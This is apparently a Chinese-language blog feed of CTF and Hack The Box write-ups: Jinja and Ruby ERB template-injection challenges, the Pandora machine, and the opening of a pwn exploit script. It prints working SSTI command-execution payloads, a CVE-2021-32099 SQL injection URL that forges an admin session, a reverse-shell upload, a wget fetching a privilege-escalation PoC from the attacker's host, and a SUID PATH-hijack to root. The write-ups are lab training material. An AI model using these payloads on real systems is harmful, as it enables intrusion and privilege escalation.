born2pwn</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="meta">@rite_of_passage</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/debug')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> Response(open(__file__).read(), mimetype=<span class="string">'text/plain'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">1337</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>发现在<code>rite_of_passage</code>函数的<code>born2pwn</code>调用里存在ssti：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">report = render_template_string(acc_tmpl.</span><br><span class="line">    replace(<span class="string">'baby_ninja'</span>, query_db(<span class="string">'SELECT name FROM ninjas ORDER BY id DESC'</span>, one=<span class="literal">True</span>)[<span class="string">'name'</span>]).</span><br><span class="line">    replace(<span class="string">'reb_num'</span>, query_db(<span class="string">'SELECT COUNT(id) FROM ninjas'</span>, one=<span class="literal">True</span>).itervalues().next())</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>render_template_string</code>的传参收到我们输入的name影响。</p><p>但是存在着两个问题:</p><p>1.无论输入什么都没用什么明显区别且有意义的回显。</p><p>2<code>{ {</code>、<code>&#39;</code>、<code>&quot;</code>这几个符号被ban。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="image-20220326230753091.png" alt="image-20220326230753091"></p><p>但是无意中发现，开了报错页面</p><p><img src="image-20220326232127657.png" alt="image-20220326232127657"></p><p>因此我们可以用include 和报错来回显我们输入内容。同时，用<code>request.args</code>来传递参数来传递字符串来绕过引号。</p><p>构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#123;%25include%201.__class__.__base__.__subclasses__()[-6].__init__.__globals__.os.popen(request.args.xxx).read()|string%25&#125;&amp;xxx&#x3D;cat%20f*</span><br></pre></td></tr></table></figure><p>、从而得到flag：</p><p><img src="image-20220326141147608.png" alt="image-20220326141147608"></p><h2 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h2><p>在查看其他大佬的思路时发现他们是利用<code>session.update</code>来更新session来回显。</p><p><code>session.update</code>方法可以根据我们传入的字典来重新生成session，用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session.update(dict)</span><br><span class="line">//ps</span><br><span class="line">session.update(&#123;<span class="string">'a'</span>:<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure><p>于是构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#123;%print%20session.update(&#123;dict(a&#x3D;1)|list|last:1.__class__.__base__.__subclasses__()[-6].__init__.__globals__.os.popen(request.args.xxx).read()&#125;)%&#125;&amp;xxx&#x3D;cat%20fA*</span><br></pre></td></tr></table></figure><p><img src="image-20220326235131162.png" alt="image-20220326235131162"></p><p>解base64后得到flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lexs@DESKTOP-MAKMNL3:~$ echo eyJhIjp7IiBiIjoiU0ZSQ2UySTBZbmxmYm1sdWFqUnpYMlF3Ym5SZlp6TjBYM0YxTUhRelpGOHdjbDlqTkhWbmFGUjl</span><br><span class="line">DZz09In19.Yj82BA.RZT3ond24hjE5PZXd2P0P9CHTz|base64 -d</span><br><span class="line">&#123;"a":&#123;" b":"SFRCe2I0YnlfbmluajRzX2QwbnRfZzN0X3F1MHQzZF8wcl9jNHVnaFR9Cg=="&#125;&#125;base64: invalid input</span><br><span class="line">lexs@DESKTOP-MAKMNL3:~$ echo SFRCe2I0YnlfbmluajRzX2QwbnRfZzN0X3F1MHQzZF8wcl9jNHVnaFR9Cg==|base64 -d</span><br><span class="line">HTB&#123;b4by_ninj4s_d0nt_g3t_qu0t3d_0r_c4ughT&#125;</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://lexsd6.github.io/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/">https://lexsd6.github.io/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/</a></p><p><a href="https://lexsd6.github.io/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">https://lexsd6.github.io/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/</a></p><p><a href="https://www.zapstiko.com/baby-ninja-jinja-challenge-htb-by-raihan-biswas/" target="_blank" rel="noopener">https://www.zapstiko.com/baby-ninja-jinja-challenge-htb-by-raihan-biswas/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;单纯的python ssti 已经是过去了,但是偶尔刷下还是有意思…</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    <category term="HTB" scheme="lexsd6.github.io/categories/CTF/HTB/"/>
    
    
    <category term="web" scheme="lexsd6.github.io/tags/web/"/>
    
    <category term="python" scheme="lexsd6.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Neonify-web-challenge-wp</title>
    <link href="lexsd6.github.io/2022/03/26/HTB-Neonify-web-challenge-wp/"/>
    <id>lexsd6.github.io/2022/03/26/HTB-Neonify-web-challenge-wp/</id>
    <published>2022-03-26T03:00:20.000Z</published>
    <updated>2022-04-01T03:39:48.134Z</updated>
    
    <content type="html"><![CDATA[<p>第一次遇到ruby后端,感觉ruby语法也有点意思<a id="more"></a><br><img src="image-20220401113528771.png" alt="image-20220401113528771"></p><h2 id="漏洞查询"><a href="#漏洞查询" class="headerlink" title="漏洞查询"></a>漏洞查询</h2><p>分析题目源码：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NeonControllers</span> &lt; Sinatra::Base</span></span><br><span class="line"></span><br><span class="line">  configure <span class="keyword">do</span></span><br><span class="line">    set <span class="symbol">:views</span>, <span class="string">"app/views"</span></span><br><span class="line">    set <span class="symbol">:public_dir</span>, <span class="string">"public"</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  get <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">    @neon = <span class="string">"Glow With The Flow"</span></span><br><span class="line">    erb <span class="symbol">:<span class="string">'index'</span></span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  post <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> params[<span class="symbol">:neon</span>] =~ <span class="regexp">/^[0-9a-z ]+$/i</span></span><br><span class="line">      @neon = ERB.new(params[<span class="symbol">:neon</span>]).result(binding)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      @neon = <span class="string">"Malicious Input Detected"</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    erb <span class="symbol">:<span class="string">'index'</span></span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>发现题目是ruby语言写的后端。进行代码审计发现<code>if params[:neon] =~ /^[0-9a-z ]+$/i</code> 发现存在换行绕过。</p><p><img src="image-20220326111436835.png" alt="image-20220326111436835"></p><p>于是<code>neon=1111%0axxxxj!&lt;&gt;</code>绕过正则限制.</p><p><img src="image-20220326111830872.png" alt="image-20220326111830872"></p><p>然后，一下找不到什么利用点了，但是百度下ERB发现是Embedded RuBy的简称，意思是嵌入式的Ruby，是一种文本模板技术.语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;% %&gt;</span><br><span class="line">在括号内执行ruby代码。</span><br><span class="line"></span><br><span class="line">&lt;%&#x3D; %&gt;</span><br><span class="line">在ERB文件中打印一些东西。</span><br><span class="line"></span><br><span class="line">&lt;% -%&gt;</span><br><span class="line">避免在表达式后中断行。</span><br><span class="line"></span><br><span class="line">&lt;%# %&gt;</span><br><span class="line">括号内的注释；未发送到客户端(与HTML注释相反)。</span><br></pre></td></tr></table></figure><p>其中提到一个例子：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlTemplate = ERB.new <span class="string">%q&#123;  </span></span><br><span class="line"><span class="string">&lt;%for organization in domains.keys%&gt;  </span></span><br><span class="line"><span class="string">    insert into org_domain(Domain, organization) values('&lt;%=domains[organization]%&gt;','&lt;%=organization%&gt;');  </span></span><br><span class="line"><span class="string">&lt;%end%&gt;  </span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>因此猜测在<code>ERB.new(params[:neon]).result(binding)</code>处用ssti.</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们可以通过<code>&lt;% %&gt;</code>来执行代码，但是我们看不到回显。下面例子可以看到程序因为找不到xxx而报错。说明我们的代码被执行了。</p><p><img src="image-20220326112945963.png" alt="image-20220326112945963"></p><p>但是传统的system,exec都无法直接回显。都要通过vps反弹shell。</p><p>通过收集资料发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file &#x3D; &#39;|whoami&#39;</span><br><span class="line">puts open(file).read()  # ubuntu</span><br><span class="line">puts open(file).gets    # ubuntu</span><br></pre></td></tr></table></figure><p>open可以回显出命令执行结果。</p><p>因此我们构造payload即可得到flag</p><p><code>neon=1111%0axxxxj!&lt;/h1&gt;&lt;%25=open(&#39;|cat f*&#39;).read()%25&gt;&lt;h1&gt;</code></p><p><img src="image-20220326120227996.png" alt="image-20220326120227996"></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.cnblogs.com/cuimiemie/p/6442695.html" target="_blank" rel="noopener">https://www.cnblogs.com/cuimiemie/p/6442695.html</a></p><p><a href="https://droidyue.com/blog/2014/11/18/six-ways-to-run-shell-in-ruby/" target="_blank" rel="noopener">https://droidyue.com/blog/2014/11/18/six-ways-to-run-shell-in-ruby/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;第一次遇到ruby后端,感觉ruby语法也有点意思</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    <category term="HTB" scheme="lexsd6.github.io/categories/CTF/HTB/"/>
    
    
    <category term="web" scheme="lexsd6.github.io/tags/web/"/>
    
    <category term="ruby" scheme="lexsd6.github.io/tags/ruby/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Pandora-Machine-wp</title>
    <link href="lexsd6.github.io/2022/03/08/HTB-Pandora-wp/"/>
    <id>lexsd6.github.io/2022/03/08/HTB-Pandora-wp/</id>
    <published>2022-03-08T12:12:30.367Z</published>
    <updated>2022-03-10T08:37:03.163Z</updated>
    
    <content type="html"><![CDATA[<p>hackthebox-Pandora-Machine <a id="more"></a></p><p><img src="image-20220310162659811.png" alt="image-20220310162659811"></p><h2 id="个人思路"><a href="#个人思路" class="headerlink" title="个人思路"></a>个人思路</h2><p>拿到题目先用nmap执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sU  10.10.11.136</span><br></pre></td></tr></table></figure><p>扫描下其端口服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─# nmap -sS -sU  10.10.11.136                                             </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-08 23:53 CST</span><br><span class="line">Stats: 0:17:29 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 99.91% done; ETC: 00:10 (0:00:01 remaining)</span><br><span class="line">Nmap scan report for 10.10.11.136</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 1994 closed ports</span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line">22/tcp    open          ssh</span><br><span class="line">80/tcp    open          http</span><br><span class="line">161/udp   open|filtered snmp</span><br><span class="line">1032/udp  open|filtered iad3</span><br><span class="line">31731/udp open|filtered unknown</span><br><span class="line">36669/udp open|filtered unknown</span><br></pre></td></tr></table></figure><p>发现有熟悉的80端口，用浏览器去访问下</p><p><img src="image-20220309102901245.png" alt="image-20220309102901245"></p><p>发现除了静态前端外，基本没有什么敏感点。</p><p><img src="image-20220309104114607.png" alt="image-20220309104114607"></p><p>除了有一次看起来有问题的信息反馈，但测试下在我们前端并无明显反馈，且不像用sql注入之内的的漏洞，更像是功能没用写全……</p><p>然后看下DNS映射，<code>Pandora.htb</code>域名对外映射的就是我们访问的web服务。</p><p>没用什么思路，用dirseach 扫描下路径看下有没有什么有用的信息。</p><p>执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u 10.10.11.136</span><br></pre></td></tr></table></figure><p>得到结果：</p><p><img src="image-20220309111906091.png" alt="image-20220309111906091"></p><p>仔细审查下，发现assets目录貌似有一个目录穿越</p><p><img src="image-20220309112415563.png" alt="image-20220309112415563"></p><p>然后发现都跟页面显示相关……没有什么可以利用点。</p><p>回到nmap信息，发现除了ssh服务和web服务还有snmp服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">161&#x2F;udp   open|filtered snmp</span><br></pre></td></tr></table></figure><p>先用<code>searchsploit  snmp</code>查询下发现这个服务还挺多问题的：</p><p><img src="image-20220309130158869.png" alt="image-20220309130158869"></p><p>通过谷歌找了篇文章来了解snmp的大概：</p><p><a href="https://www.anquanke.com/post/id/260832" target="_blank" rel="noopener">https://www.anquanke.com/post/id/260832</a></p><p>了解到SNMP协议主要用来接收网络节点的通知消息和警告时间报告等，从而获知网络出现的问题。</p><p>而文章中提到了一种工具 snmpwalk，snmpwalk是SNMP的一个工具，它使用SNMP的GETNEXT请求查询指定OID（SNMP协议中的对象标识）入口的所有OID树信息，并显示给用户。snmpwalk使用方法很简单，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -v 1或2c(代表SNMP版本) -c SNMP读团体密码 IP地址 OID(对象标示符)</span><br><span class="line">–v：指定snmp的版本, 1或者2c，该参数必须有。</span><br><span class="line">–c：指定连接设备SNMPSNMP读团体密码，该参数必须有。 密码一般在snmpd.conf中,默认为public</span><br><span class="line">IP：指定要walk的设备的IP地址，该参数必须有。</span><br><span class="line">OID：代表要获取设备的指标oid，该参数不是必须的。</span><br></pre></td></tr></table></figure><p>具体可以查看：</p><p><a href="https://www.cnblogs.com/--smile/p/11086770.html" target="_blank" rel="noopener">https://www.cnblogs.com/--smile/p/11086770.html</a></p><p>执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -v 2c Pandora.htb –c public &gt; 1.txt</span><br></pre></td></tr></table></figure><p>在1.txt 发现一个有意识的命令执行记录：</p><p><img src="image-20220309223818806.png" alt="image-20220309223818806"></p><p>推测是有个用户名为dantel 密码为HotelBabylon23</p><p>用ssh 登录看看</p><p><img src="image-20220309231540290.png" alt="image-20220309231540290"></p><p>发现成功登录，但user flag 在另一个用户目录下没有权限读取。</p><p><img src="image-20220309231702161.png" alt="image-20220309231702161"></p><p>这里用<code>lsb_release -a</code>  和<code>uname -r</code>来查询发行版本与内核版本。</p><p><img src="image-20220309232153234.png" alt="image-20220309232153234"></p><p>发现是Ubuntu 20.04.3 LTS，于是谷歌下发现有CVE-2021-4034提取。在github上找了个poc：</p><p><a href="https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py" target="_blank" rel="noopener">https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py</a></p><p>用python 来搭建简单http服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 9090</span><br></pre></td></tr></table></figure><p>执行上面命令。在自己的电脑9090端口开启web服务。</p><p>在靶场机器上执行<code>wget 10.10.14.94:9090/cve2021-4034.py</code>来获取poc：</p><p><img src="image-20220309233250045.png" alt="image-20220309233250045"></p><p>执行poc，来获得root:</p><p><img src="image-20220309233402834.png" alt="image-20220309233402834"></p><p>这里一下全到root才发现自己可能非预期了，但已经有权限读取root.txt和user.txt了</p><p><img src="image-20220309233503275.png" alt="image-20220309233503275"></p><h2 id="正常解法"><a href="#正常解法" class="headerlink" title="正常解法"></a>正常解法</h2><p>在看了其他大佬wp发现自己完全避开，关键点…..tcl.</p><p>由于daniel用法在curl 80端口时出现不同页面，所有怀疑有内网服务。</p><p>用命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8001:127.0.0.1:80  daniel@10.10.11.136</span><br></pre></td></tr></table></figure><p>来转发端口，可以看到有个全新web页面</p><p><img src="image-20220310150454237.png" alt="image-20220310150454237"></p><p>根据下方提示版本，谷歌后发现是Pandora模板（正好点题）</p><p>d但是我们不知道后台密码，经过谷歌后发现CVE-2021-32099可以通过sql注入获得admin cookie</p><p>poc 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?session_id&#x3D;a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27&#x3D;%271</span><br></pre></td></tr></table></figure><p>然后我们进入管理页面，</p><p><img src="image-20220310150437770.png" alt="image-20220310150437770"></p><p>在后门页面的admin tools 的文件管理里上传后门反弹shell文件</p><p><img src="image-20220310150914241.png" alt="image-20220310150914241"></p><p>通过base64 解密url中base64部分得到相对位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─# echo L3BhbmRvcmFfY29uc29sZS9pbmNsdWRlLy4uLy9hdHRhY2htZW50L2ZpbGVzX3JlcG8vMV9hYWEucGhw|base64 -d</span><br><span class="line">&#x2F;pandora_console&#x2F;include&#x2F;..&#x2F;&#x2F;attachment&#x2F;files_repo&#x2F;1_aaa.php</span><br></pre></td></tr></table></figure><p>访问后门得到shell</p><p><img src="image-20220310143003847.png" alt="image-20220310143003847"></p><p>用<code>find / -perm -u=s 2&gt; /dev/null</code> 找是否用权限配置有问题的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pandora_backup</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;at</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;fusermount</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1</span><br></pre></td></tr></table></figure><p>发现/usr/bin/pandora_backup 有点可疑。</p><p>运行后，shell崩了，可能用什么报错信息未看到，用python 加固shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>cp  pandora_backup  到web 目录<code>/var/www/pandora/pandora_console/images</code>下,在我们用户机器上访问下载。</p><p>在ida 里F5反汇编:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__uid_t</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">__uid_t</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v3 = getuid();</span><br><span class="line">  v4 = geteuid();</span><br><span class="line">  setreuid(v4, v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"PandoraFMS Backup Utility"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Now attempting to backup PandoraFMS client"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( system(<span class="string">"tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Backup failed!\nCheck your permissions!"</span>);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Backup successful!"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Terminating program!"</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现程序调用tar 但是使用system来调用，没用明确是哪个tar，我们可以伪造一个tar添加到环境变量中，让系统调用我们就可</p><p>切换到matt的用户目录，然后创建由<code>/bin/bash</code>一个假的tar可执行文件，并将matt的家路径注入PATH变量中,这样可以在<code>tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*</code>命令结束后仍然在/bin/bash命令中</p><p>这是本地用/bin/sh做的实验：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─# .&#x2F;tar -cvf &#x2F;root&#x2F;.backup&#x2F;pandora-backup.tar.gz &#x2F;var&#x2F;www&#x2F;pandora&#x2F;pandora_console</span><br><span class="line"># </span><br><span class="line">#</span><br></pre></td></tr></table></figure><p>因此我们在远程伪造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;home&#x2F;matt&#x2F;</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; tar</span><br><span class="line">chmod +x tar</span><br><span class="line">export PATH&#x3D;&#x2F;home&#x2F;matt:$PATH</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pandora_backup</span><br></pre></td></tr></table></figure><p>然后得到root</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;hackthebox-Pandora-Machine</summary>
    
    
    
    <category term="HTB" scheme="lexsd6.github.io/categories/HTB/"/>
    
    
    <category term="Machine" scheme="lexsd6.github.io/tags/Machine/"/>
    
  </entry>
  
  <entry>
    <title>HSC2021-CTF-pwn</title>
    <link href="lexsd6.github.io/2022/02/22/HSC2021-CTF/"/>
    <id>lexsd6.github.io/2022/02/22/HSC2021-CTF/</id>
    <published>2022-02-22T09:34:26.542Z</published>
    <updated>2022-02-22T12:29:12.169Z</updated>
    
    <content type="html"><![CDATA[<p>红客突击队ctf，好久没打ctf了，正好适合用来练手，感觉自己又变菜了……<a id="more"></a></p><h2 id="EZ-pwn"><a href="#EZ-pwn" class="headerlink" title="EZ_pwn"></a>EZ_pwn</h2><p>真ez pwn 题目给了后门，栈溢出改RIP为后门地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/02/20 11:12:39</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./Ez_pwn'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span 